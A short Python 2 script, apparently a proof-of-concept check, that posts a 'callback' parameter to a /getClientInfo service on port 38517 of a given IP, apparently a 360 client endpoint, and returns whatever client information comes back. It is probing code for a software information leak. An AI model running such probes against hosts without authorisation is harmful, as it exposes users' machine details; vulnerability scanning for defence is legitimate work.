#!/usr/bin/env python

import requests
#from settings import logger
import settings

def pocFor360(ip):
    try:
        #settings.logger.info("test")
        target_url = "http://%s:38517/getClientInfo"  % ip
        resp = requests.post(target_url, data ={"callback":"xxxx"},timeout=0.5)
        #settings.logger.info(resp)
        if resp.status_code==200 or resp.status_code==403 or resp.status_code==500:
            return {"result":resp.text}
        else:
            return None
    except requests.RequestException,e:
        return None
